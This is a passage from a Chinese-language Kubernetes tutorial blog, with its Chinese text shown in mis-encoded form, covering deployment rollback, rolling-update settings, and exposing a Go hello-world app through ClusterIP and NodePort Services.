·çš„éƒ¨ç½²æ–¹å¼æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¹Ÿä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ‰€æœ‰çš„å‰¯æœ¬åœ¨åŒä¸€æ—¶é—´æ›´æ–°ï¼Œè¿™ä¼šå¯¼è‡´æˆ‘ä»¬ <code>hellok8s</code> æœåŠ¡åœ¨çŸ­æ—¶é—´å†…æ˜¯ä¸å¯ç”¨çš„ï¼Œå› ä¸ºæ‰€æœ‰ pod éƒ½åœ¨å‡çº§åˆ° <code>v2</code> ç‰ˆæœ¬çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ç­‰å¾…æŸä¸ª pod å‡çº§å®Œæˆåæ‰èƒ½æä¾›æœåŠ¡ã€‚</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦æ»šåŠ¨æ›´æ–° (rolling update)ï¼Œåœ¨ä¿è¯æ–°ç‰ˆæœ¬ <code>v2</code> çš„ pod è¿˜æ²¡æœ‰ <code>ready</code> ä¹‹å‰ï¼Œå…ˆä¸åˆ é™¤ <code>v1</code> ç‰ˆæœ¬çš„ podã€‚</p><p>åœ¨ deployment çš„èµ„æºå®šä¹‰ä¸­, <code>spec.strategy.type</code> æœ‰ä¸¤ç§é€‰æ‹©:</p><ul><li><strong>RollingUpdate:</strong> é€æ¸å¢åŠ æ–°ç‰ˆæœ¬çš„ podï¼Œé€æ¸å‡å°‘æ—§ç‰ˆæœ¬çš„ podã€‚</li><li><strong>Recreate:</strong> åœ¨æ–°ç‰ˆæœ¬çš„ pod å¢åŠ å‰ï¼Œå…ˆå°†æ‰€æœ‰æ—§ç‰ˆæœ¬ pod åˆ é™¤ã€‚</li></ul><p>å¤§å¤šæ•°æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé‡‡ç”¨æ»šåŠ¨æ›´æ–° (RollingUpdate) çš„æ–¹å¼ï¼Œæ»šåŠ¨æ›´æ–°åˆå¯ä»¥é€šè¿‡ <code>maxSurge</code> å’Œ <code>maxUnavailable</code> å­—æ®µæ¥æ§åˆ¶å‡çº§ pod çš„é€Ÿç‡ï¼Œå…·ä½“å¯ä»¥è¯¦ç»†çœ‹<a href="https://kubernetes.io/zh-cn/docs/concepts/workloads/controllers/deployment/">å®˜ç½‘å®šä¹‰</a>ã€‚ï¼š</p><ul><li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#max-surge"><strong>maxSurge:</strong></a> æœ€å¤§å³°å€¼ï¼Œç”¨æ¥æŒ‡å®šå¯ä»¥åˆ›å»ºçš„è¶…å‡ºæœŸæœ› Pod ä¸ªæ•°çš„ Pod æ•°é‡ã€‚</li><li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#max-unavailable,"><strong>maxUnavailable:</strong></a> æœ€å¤§ä¸å¯ç”¨ï¼Œç”¨æ¥æŒ‡å®šæ›´æ–°è¿‡ç¨‹ä¸­ä¸å¯ç”¨çš„ Pod çš„ä¸ªæ•°ä¸Šé™ã€‚</li></ul><p>æˆ‘ä»¬å…ˆè¾“å…¥å‘½ä»¤å›æ»šæˆ‘ä»¬çš„ deploymentï¼Œè¾“å…¥ <code>kubectl describe pod</code> ä¼šå‘ç° deployment å·²ç»æŠŠ <code>v2</code> ç‰ˆæœ¬çš„ pod å›æ»šåˆ° <code>v1</code> çš„ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#å›æ»šåˆ°ä¸Šç‰ˆæœ¬</span><br>kubectl rollout undo deployment hellok8s-deployment<br><br>kubectl get pods<br>NAME                                   READY   STATUS    RESTARTS   AGE<br>hellok8s-deployment-74fb85d55c-976mz   1/1     Running   0          14s<br>hellok8s-deployment-74fb85d55c-l6p5q   1/1     Running   0          11s<br>hellok8s-deployment-74fb85d55c-qbd4w   1/1     Running   0          9s<br><br><span class="hljs-comment">#æŸ¥çœ‹podè¯¦ç»†ä¿¡æ¯</span><br>kubectl describe pod hellok8s-deployment-74fb85d55c-976mz<br>Image:          crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v1<br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢çš„å‘½ä»¤ï¼Œè¿˜å¯ä»¥ç”¨ <code>history</code> æ¥æŸ¥çœ‹å†å²ç‰ˆæœ¬ï¼Œ<code>--to-revision=2</code> æ¥å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl rollout history deployment hellok8s-deployment<br>kubectl rollout undo deployment/hellok8s-deployment --to-revision=2<br></code></pre></td></tr></table></figure><p>æ¥ç€è®¾ç½® <code>strategy=rollingUpdate</code> , <code>maxSurge=1</code> , <code>maxUnavailable=1</code> å’Œ <code>replicas=3</code> åˆ° deployment.yaml æ–‡ä»¶ä¸­ã€‚è¿™ä¸ªå‚æ•°é…ç½®æ„å‘³ç€æœ€å¤§å¯èƒ½ä¼šåˆ›å»º 4 ä¸ª hellok8s pod (replicas + maxSurge)ï¼Œæœ€å°ä¼šæœ‰ 2 ä¸ª hellok8s pod å­˜æ´» (replicas - maxUnavailable)</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> apps<span class="hljs-symbol">/v1</span><br><span class="hljs-params">kind:</span> Deployment<br><span class="hljs-params">metadata:</span><br>  <span class="hljs-params">name:</span> hellok8s-deployment<br><span class="hljs-params">spec:</span><br>  <span class="hljs-params">strategy:</span><br>     <span class="hljs-params">rollingUpdate:</span><br>      <span class="hljs-params">maxSurge:</span> <span class="hljs-number">1</span><br>      <span class="hljs-params">maxUnavailable:</span> <span class="hljs-number">1</span><br>  <span class="hljs-params">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">selector:</span><br>    <span class="hljs-params">matchLabels:</span><br>      <span class="hljs-params">app:</span> hellok8s<br>  <span class="hljs-params">template:</span><br>    <span class="hljs-params">metadata:</span><br>      <span class="hljs-params">labels:</span><br>        <span class="hljs-params">app:</span> hellok8s<br>    <span class="hljs-params">spec:</span><br>      <span class="hljs-params">containers:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> hellok8s-container<br>          <span class="hljs-params">image:</span> crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com<span class="hljs-operator">/</span>xpshub<span class="hljs-operator">/</span>k8s:v2<br>      <span class="hljs-params">imagePullSecrets:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-params">name:</span> é˜¿é‡Œäº‘å¯†ç <br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/rollingupdate.png" alt="rollingupdate"></p><h1 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h1><p>ç»è¿‡å‰é¢å‡ èŠ‚çš„ç»ƒä¹ ï¼Œå¯èƒ½ä½ ä¼šæœ‰ä¸€äº›ç–‘æƒ‘ï¼š</p><ul><li>ä¸ºä»€ä¹ˆ pod ä¸å°±ç»ª (Ready) çš„è¯ï¼Œ<code>kubernetes</code> ä¸ä¼šå°†æµé‡é‡å®šå‘åˆ°è¯¥ podï¼Œè¿™æ˜¯æ€ä¹ˆåšåˆ°çš„ï¼Ÿ</li><li>å‰é¢è®¿é—®æœåŠ¡çš„æ–¹å¼æ˜¯é€šè¿‡ <code>port-forword</code> å°† pod çš„ç«¯å£æš´éœ²åˆ°æœ¬åœ°ï¼Œä¸ä»…éœ€è¦å†™å¯¹ pod çš„åå­—ï¼Œä¸€æ—¦ deployment é‡æ–°åˆ›å»ºæ–°çš„ podï¼Œpod åå­—å’Œ IP åœ°å€ä¹Ÿä¼šéšä¹‹å˜åŒ–ï¼Œå¦‚ä½•ä¿è¯ç¨³å®šçš„è®¿é—®åœ°å€å‘¢ï¼Ÿã€‚</li><li>å¦‚æœä½¿ç”¨ deployment éƒ¨ç½²äº†å¤šä¸ª Pod å‰¯æœ¬ï¼Œå¦‚ä½•åšè´Ÿè½½å‡è¡¡å‘¢ï¼Ÿ</li></ul><p><code>kubernetes</code> æä¾›äº†ä¸€ç§åå« <code>Service</code> çš„èµ„æºå¸®åŠ©è§£å†³è¿™äº›é—®é¢˜ï¼Œå®ƒä¸º pod æä¾›ä¸€ä¸ªç¨³å®šçš„ Endpointã€‚Service ä½äº pod çš„å‰é¢ï¼Œè´Ÿè´£æ¥æ”¶è¯·æ±‚å¹¶å°†å®ƒä»¬ä¼ é€’ç»™å®ƒåé¢çš„æ‰€æœ‰podã€‚ä¸€æ—¦æœåŠ¡ä¸­çš„ Pod é›†åˆå‘ç”Ÿæ›´æ”¹ï¼ŒEndpoints å°±ä¼šè¢«æ›´æ–°ï¼Œè¯·æ±‚çš„é‡å®šå‘è‡ªç„¶ä¹Ÿä¼šå¯¼å‘æœ€æ–°çš„ podã€‚</p><h2 id="ClusterIP"><a href="#ClusterIP" class="headerlink" title="ClusterIP"></a>ClusterIP</h2><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ <code>Service</code> é»˜è®¤ä½¿ç”¨çš„ <code>ClusterIP</code> ç±»å‹ï¼Œé¦–å…ˆåšä¸€äº›å‡†å¤‡å·¥ä½œï¼Œåœ¨ä¹‹å‰çš„ <code>hellok8s:v2</code> ç‰ˆæœ¬ä¸ŠåŠ ä¸Šè¿”å›å½“å‰æœåŠ¡æ‰€åœ¨çš„ <code>hostname</code> åŠŸèƒ½ï¼Œå‡çº§åˆ° <code>v3</code> ç‰ˆæœ¬ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hello</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>host, _ := os.Hostname()<br>io.WriteString(w, fmt.Sprintf(<span class="hljs-string">&quot;[v3] Hello, Kubernetes!, From host: %s&quot;</span>, host))<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, hello)<br>http.ListenAndServe(<span class="hljs-string">&quot;:3000&quot;</span>, <span class="hljs-literal">nil</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Dockerfile</code> å’Œä¹‹å‰ä¿æŒä¸€è‡´ï¼Œæ‰“åŒ… <code>tag=v3</code> å¹¶æ¨é€åˆ°è¿œç¨‹ä»“åº“ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build . -t hellok8s:v3<br>docker push hellok8s:v3<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ deployment çš„ <code>hellok8s</code> ä¸º <code>v3</code> ç‰ˆæœ¬ã€‚æ‰§è¡Œ <code>kubectl apply -f deployment.yaml</code> æ›´æ–° deploymentã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">apps/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Deployment</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-deployment</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">replicas:</span> <span class="hljs-number">3</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">matchLabels:</span><br>      <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">template:</span><br>    <span class="hljs-attr">metadata:</span><br>      <span class="hljs-attr">labels:</span><br>        <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>    <span class="hljs-attr">spec:</span><br>      <span class="hljs-attr">containers:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">hellok8s-container</span><br>          <span class="hljs-attr">image:</span> <span class="hljs-string">crpi-g07m1i4cb9anpvun.cn-hangzhou.personal.cr.aliyuncs.com/xpshub/k8s:v3</span><br>      <span class="hljs-attr">imagePullSecrets:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">é˜¿é‡Œäº‘å¯†ç </span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ <code>Service</code> èµ„æºçš„å®šä¹‰ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>ClusterIP</code> çš„æ–¹å¼å®šä¹‰ Serviceï¼Œé€šè¿‡ <code>kubernetes</code> é›†ç¾¤çš„å†…éƒ¨ IP æš´éœ²æœåŠ¡ï¼Œå½“æˆ‘ä»¬åªéœ€è¦è®©é›†ç¾¤ä¸­è¿è¡Œçš„å…¶ä»–åº”ç”¨ç¨‹åºè®¿é—®æˆ‘ä»¬çš„ pod æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨è¿™ç§ç±»å‹çš„Serviceã€‚é¦–å…ˆåˆ›å»ºä¸€ä¸ª service-hellok8s-clusterip.yaml æ–‡ä»¶ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">service-hellok8s-clusterip</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">ClusterIP</span><br>  <span class="hljs-attr">selector:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">hellok8s</span><br>  <span class="hljs-attr">ports:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">3000</span><br>    <span class="hljs-attr">targetPort:</span> <span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆé€šè¿‡ <code>kubectl get endpoints</code> æ¥çœ‹çœ‹ Endpointã€‚è¢« selector é€‰ä¸­çš„ Podï¼Œå°±ç§°ä¸º Service çš„ Endpointsã€‚å®ƒç»´æŠ¤ç€ Pod çš„ IP åœ°å€ï¼Œåªè¦æœåŠ¡ä¸­çš„ Pod é›†åˆå‘ç”Ÿæ›´æ”¹ï¼ŒEndpoints å°±ä¼šè¢«æ›´æ–°ã€‚é€šè¿‡ <code>kubectl get pod -o wide</code> å‘½ä»¤è·å– Pod æ›´å¤šçš„ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ° 3 ä¸ª Pod çš„ IP åœ°å€å’Œ Endpoints ä¸­æ˜¯ä¿æŒä¸€è‡´çš„ï¼Œä½ å¯ä»¥è¯•è¯•å¢å¤§æˆ–å‡å°‘ Deployment ä¸­ Pod çš„ replicasï¼Œè§‚å¯Ÿ Endpoints ä¼šä¸ä¼šå‘ç”Ÿå˜åŒ–ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">kubectl apply -f service-hellok8s-clusterip.yaml<br><br>kubectl get endpoints<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                         ENDPOINTS                                          AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-hellok8s-clusterip   172.17.0.10:3000,172.17.0.2:3000,172.17.0.3:3000   10s</span><br><br>kubectl get pod -o wide<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                                   READY   STATUS    RESTARTS   AGE    IP           NODE</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-24lw5   1/1     Running   0          112s   172.17.0.7   minikube</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9g94t   1/1     Running   0          112s   172.17.0.3   minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">hellok8s-deployment-5d5545b69c-9gm8r   1/1     Running   0          112s   172.17.0.2   minikube</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx                                  1/1     Running   0          112s   172.17.0.9   minikube</span><br><br>kubectl get service<br><span class="hljs-meta prompt_"># </span><span class="language-bash">NAME                         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">service-hellok8s-clusterip   ClusterIP   10.104.96.153   &lt;none&gt;        3000/TCP   10s</span><br></code></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨é›†ç¾¤å…¶å®ƒåº”ç”¨ä¸­è®¿é—® <code>service-hellok8s-clusterip</code> çš„ IP åœ°å€ <code>10.104.96.153</code> æ¥è®¿é—® <code>hellok8s:v3</code> æœåŠ¡ã€‚</p><p>ä½†æ˜¯<code>ClusterIP</code> çš„æ–¹å¼åªèƒ½é›†ç¾¤å†…éƒ¨è®¿é—®ï¼Œä¸èƒ½å®¹å™¨å¤–éƒ¨è®¿é—®</p><p>è¿™é‡Œé€šè¿‡åœ¨é›†ç¾¤å†…åˆ›å»ºä¸€ä¸ª <code>nginx</code> æ¥è®¿é—® <code>hellok8s</code> æœåŠ¡ã€‚åˆ›å»ºåè¿›å…¥ <code>nginx</code> å®¹å™¨æ¥ç”¨ <code>curl</code> å‘½ä»¤è®¿é—® <code>service-hellok8s-clusterip</code> ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>  <span class="hljs-attr">labels:</span><br>    <span class="hljs-attr">app:</span> <span class="hljs-string">nginx</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">nginx-container</span><br>      <span class="hljs-attr">image:</span> <span class="hljs-string">nginx</span><br><span class="hljs-string">kubectl</span> <span class="hljs-string">get</span> <span class="hljs-string">pods</span><br><span class="hljs-comment"># NAME                                   READY   STATUS    RESTARTS   AGE</span><br><span class="hljs-comment"># hellok8s-deployment-5d5545b69c-24lw5   1/1     Running   0          27m</span><br><span class="hljs-comment"># hellok8s-deployment-5d5545b69c-9g94t   1/1     Running   0          27m</span><br><span class="hljs-comment"># hellok8s-deployment-5d5545b69c-9gm8r   1/1     Running   0          27m</span><br><span class="hljs-comment"># nginx                                  1/1     Running   0          41m</span><br><br><span class="hljs-string">kubectl</span> <span class="hljs-string">get</span> <span class="hljs-string">service</span><br><span class="hljs-comment"># NAME                         TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE</span><br><span class="hljs-comment"># service-hellok8s-clusterip   ClusterIP   10.104.96.153   &lt;none&gt;        3000/TCP   10s</span><br><br><span class="hljs-string">kubectl</span> <span class="hljs-string">exec</span> <span class="hljs-string">-it</span> <span class="hljs-string">nginx-pod</span> <span class="hljs-string">--</span> <span class="hljs-string">/bin/bash</span><br><span class="hljs-comment"># root@nginx-pod:/# curl 10.104.96.153:3000</span><br><span class="hljs-comment"># [v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-9gm8r</span><br><span class="hljs-comment"># root@nginx-pod:/# curl 10.104.96.153:3000</span><br><span class="hljs-comment">#[v3] Hello, Kubernetes!, From host: hellok8s-deployment-5d5545b69c-9g94t</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¤šæ¬¡ <code>curl 10.104.96.153:3000</code> è®¿é—® <code>hellok8s</code> Service IP åœ°å€ï¼Œè¿”å›çš„ <code>hellok8s:v3</code> <code>hostname</code> ä¸ä¸€æ ·ï¼Œè¯´æ˜ Service å¯ä»¥æ¥æ”¶è¯·æ±‚å¹¶å°†å®ƒä»¬ä¼ é€’ç»™å®ƒåé¢çš„æ‰€æœ‰ podï¼Œè¿˜å¯ä»¥è‡ªåŠ¨è´Ÿè½½å‡è¡¡ã€‚ä½ ä¹Ÿå¯ä»¥è¯•è¯•å¢åŠ æˆ–è€…å‡å°‘ <code>hellok8s:v3</code> pod å‰¯æœ¬æ•°é‡ï¼Œè§‚å¯Ÿ Service çš„è¯·æ±‚æ˜¯å¦ä¼šåŠ¨æ€å˜æ›´ã€‚è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/service-clusterip-fix-name.png" alt="service-clusterip-fix-name"></p><p>é™¤äº†ä¸Šè¿°çš„ <code>ClusterIp</code> çš„æ–¹å¼å¤–ï¼ŒKubernetes <code>ServiceTypes</code> å…è®¸æŒ‡å®šä½ æ‰€éœ€è¦çš„ Service ç±»å‹ï¼Œé»˜è®¤æ˜¯ <code>ClusterIP</code>ã€‚<code>Type</code> çš„å€¼åŒ…æ‹¬å¦‚ä¸‹ï¼š</p><ul><li><code>ClusterIP</code>ï¼šé€šè¿‡é›†ç¾¤çš„å†…éƒ¨ IP æš´éœ²æœåŠ¡ï¼Œé€‰æ‹©è¯¥å€¼æ—¶æœåŠ¡åªèƒ½å¤Ÿåœ¨é›†ç¾¤å†…éƒ¨è®¿é—®ã€‚ è¿™ä¹Ÿæ˜¯é»˜è®¤çš„ <code>ServiceType</code>ã€‚</li><li><a href="https://kubernetes.io/docs/concepts/services-networking/service/#type-nodeport"><code>NodePort</code></a>ï¼šé€šè¿‡æ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„ IP å’Œé™æ€ç«¯å£ï¼ˆ<code>NodePort</code>ï¼‰æš´éœ²æœåŠ¡ã€‚ <code>NodePort</code> æœåŠ¡ä¼šè·¯ç”±åˆ°è‡ªåŠ¨åˆ›å»ºçš„ <code>ClusterIP</code> æœåŠ¡ã€‚ é€šè¿‡è¯·æ±‚ <code>&lt;èŠ‚ç‚¹ IP&gt;:&lt;èŠ‚ç‚¹ç«¯å£&gt;</code>ï¼Œä½ å¯ä»¥ä»é›†ç¾¤çš„å¤–éƒ¨è®¿é—®ä¸€ä¸ª <code>NodePort</code> æœåŠ¡ã€‚</li><li><a href="https://kubernetes.io/docs/concepts/services-networking/service/#loadbalancer"><code>LoadBalancer</code></a>ï¼šä½¿ç”¨äº‘æä¾›å•†çš„è´Ÿè½½å‡è¡¡å™¨å‘å¤–éƒ¨æš´éœ²æœåŠ¡ã€‚ å¤–éƒ¨è´Ÿè½½å‡è¡¡å™¨å¯ä»¥å°†æµé‡è·¯ç”±åˆ°è‡ªåŠ¨åˆ›å»ºçš„ <code>NodePort</code> æœåŠ¡å’Œ <code>ClusterIP</code> æœåŠ¡ä¸Šã€‚</li><li><a href="https://kubernetes.io/docs/concepts/services-networking/service/#externalname"><code>ExternalName</code></a>ï¼šé€šè¿‡è¿”å› <code>CNAME</code> å’Œå¯¹åº”å€¼ï¼Œå¯ä»¥å°†æœåŠ¡æ˜ å°„åˆ° <code>externalName</code> å­—æ®µçš„å†…å®¹ï¼ˆä¾‹å¦‚ï¼Œ<code>foo.bar.example.com</code>ï¼‰ã€‚ æ— éœ€åˆ›å»ºä»»ä½•ç±»å‹ä»£ç†ã€‚</li></ul><h2 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h2><p>æˆ‘ä»¬çŸ¥é“<code>kubernetes</code> é›†ç¾¤å¹¶ä¸æ˜¯å•æœºè¿è¡Œï¼Œå®ƒç®¡ç†ç€å¤šå°èŠ‚ç‚¹å³ <a href="https://kubernetes.io/docs/concepts/architecture/nodes/">Node</a>ï¼Œå¯ä»¥é€šè¿‡æ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„ IP å’Œé™æ€ç«¯å£ï¼ˆ<code>NodePort</code>ï¼‰æš´éœ²æœåŠ¡ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¦‚æœé›†ç¾¤å†…æœ‰ä¸¤å° Node è¿è¡Œç€ <code>hellok8s:v3</code>ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª <code>NodePort</code> ç±»å‹çš„ Serviceï¼Œå°† <code>hellok8s:v3</code> çš„ <code>3000</code> ç«¯å£æ˜ å°„åˆ° Node æœºå™¨çš„ <code>30000</code> ç«¯å£ (åœ¨ 30000-32767 èŒƒå›´å†…)ï¼Œå°±å¯ä»¥é€šè¿‡è®¿é—® <code>http://node1-ip:30000</code> æˆ–è€… <code>http://node2-ip:30000</code> è®¿é—®åˆ°æœåŠ¡ã€‚</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/service-nodeport-fix-name.png" alt="service-nodeport-fix-name"></p><p>è¿™é‡Œä»¥ <code>minikube</code> ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>minikube ip</code> å‘½ä»¤æ‹¿åˆ° k8s cluster node IPåœ°å€ã€‚ä¸‹é¢çš„æ•™ç¨‹éƒ½ä»¥æˆ‘æœ¬æœºçš„ <code>192.168.49.2</code> ä¸ºä¾‹ï¼Œéœ€è¦æ›¿æ¢æˆä½ çš„ IP åœ°å€ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">minikube ip<br><span class="hljs-meta prompt_"># </span><span class="language-bash">192.168.49.2</span><br></code></pre></td></tr></table></figure><p>æ¥ç€ä»¥ NodePort çš„ ServiceType åˆ›å»ºä¸€ä¸ª Service æ¥æ¥ç®¡ pod æµé‡ã€‚é€šè¿‡<code>minikube</code> èŠ‚ç‚¹ä¸Šçš„ IP <code>192.168.49.2</code> æš´éœ²æœåŠ¡ã€‚ <code>NodePort</code> æœåŠ¡ä¼šè·¯ç”±åˆ°è‡ªåŠ¨åˆ›å»ºçš„ <code>ClusterIP</code> æœåŠ¡ã€‚ é€šè¿‡è¯·æ±‚ <code>&lt;èŠ‚ç‚¹ IP&gt;:&lt;èŠ‚ç‚¹ç«¯å£&gt;</code> â€“ <code>192.168.49.2:30000</code>ï¼Œä½ 